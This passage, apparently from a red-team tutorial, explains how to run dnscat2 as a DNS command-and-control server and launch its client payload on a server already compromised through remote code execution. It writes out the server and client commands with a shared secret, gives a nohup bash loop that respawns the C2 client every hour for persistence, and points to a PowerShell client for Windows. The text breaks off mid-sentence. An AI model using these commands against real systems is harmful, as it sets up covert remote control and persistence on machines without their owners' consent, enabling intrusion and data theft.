    Now that we have our authoritative DNS configured, our attacker server running
    dnscat2 as a DNS server, and our malware compiled, we are ready to execute our
    payload.


    Before we begin, we need to start dnscat on our attacker server. Although there
    are multiple configurations to enable, the main one is configuring the --secret
    flag to make sure our communication within the DNS requests is encrypted. Make
    sure to replace localhost.com with the domain name you use and create a secret
    string.


    To start the dnscat2 on your attacker server:


    +   - screen

    - ruby ./dnscat2 localhost.com --secret 39dfj3hdfsfjah37e8c902j


    Let''s say we have some sort of RCE on a vulnerable server. You are able to run
    shell commands and upload our dnscat payload. To execute our payload:


    +   - /dnscat2 localhost.com --secret 39dfj3hdfsfjah37e8c902j

    - nohup /bin/bash "while true; do /opt/dnscat2/client/dnscat localhost.com --secret
    39dfj3hdfsfjah37e8c902j --max-retransmits 5; sleep 3600; done" > /dev/null 2>&1


    This will start dnscat, our authoritative server, and create our C2 channel. One
    thing I see is there are times when dnscat2 dies. This could be from large file
    transfers or something just gets messed up. To circumvent these types of issues,
    I generally like to make sure that my dnscat payload returns. For this, I generally
    like to start my dnscat payload with a quick bash script:


    This will make sure that if the client side payload dies for any reason, it will
    spawn a new instance every hour. Sometimes you only have one chance to get your
    payloads to run, so you need to make them count!


    Lastly, if you are going to run this payload on Windows, you could use the dnscat
    payload or... why not in PowerShell?! Luke Baggett wrote up a PowerShell version
    of the dnscat2 client: https://github.com/lukebuggett/dnscat2-powershell.


    # The dnscat2 Connection


    After our payload executes and connects back to our attacker server, we should
